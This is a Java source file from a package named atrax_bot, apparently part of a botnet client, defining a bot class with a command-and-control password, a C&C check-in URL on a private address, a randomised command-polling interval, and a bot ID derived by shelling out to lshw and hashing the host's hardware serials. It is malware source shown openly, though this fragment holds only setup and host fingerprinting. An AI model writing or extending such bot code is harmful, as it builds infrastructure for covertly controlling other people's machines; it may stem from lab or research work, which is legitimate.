/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */
package atrax_bot;
import java.io.IOException;
import java.io.UnsupportedEncodingException;
import java.net.InetAddress;
import java.security.NoSuchAlgorithmException;

/**
 *
 * This class contains the key characteristics of the bot
 * The bot ID
 * The bot status
 * Sleep cycle - how often will the bot check for commands
 * 
 */
public class bot {
    // INIT
    
    // status of the bot
    String status;
    // password auth to the server
    String ccInitPwd;
    // the init URL
    String ccInitURL;
    // check for command cycle in seconds
    int checkCommandTime;
    // random check for command cycle 
    int checkCommandTimeRandom;
    // unique ID
    String botID;
    // bot's public IP address
    InetAddress publicIpAddr;
    // network parameters concerning this bot
    HostNetParams hostNetParams;
    
// CONSTRUCTOR
    public bot() {
        status = "Init";
        ccInitPwd = "!@Aj&((^)*$iKSoS)_+kYbP";
        ccInitURL = "http://192.168.16.103/";
        checkCommandTime = 10;
        checkCommandTimeRandom = 5;
        botID = "";
        publicIpAddr = null;
        hostNetParams = new HostNetParams();
    }
    
// BOT ID GENERATOR
    /**
     * Assigned a hash from the host hardware info
     * Currently only implementable on Linux
     * @throws java.io.IOException
     * @throws java.io.UnsupportedEncodingException
     * @throws java.security.NoSuchAlgorithmException
     */
    public void generateBotID() throws IOException, UnsupportedEncodingException, NoSuchAlgorithmException {
        HostDetails myHost = new HostDetails();
        String hwInfo = "";
        if (myHost.osName.toUpperCase().equals("LINUX")) {
            hwInfo = tools
                    .runCmd("lshw | grep -e serial -e product |" +
                    "grep -v Controller | grep -v None");
        }
        botID = tools.computeMD5(hwInfo);
    }
}
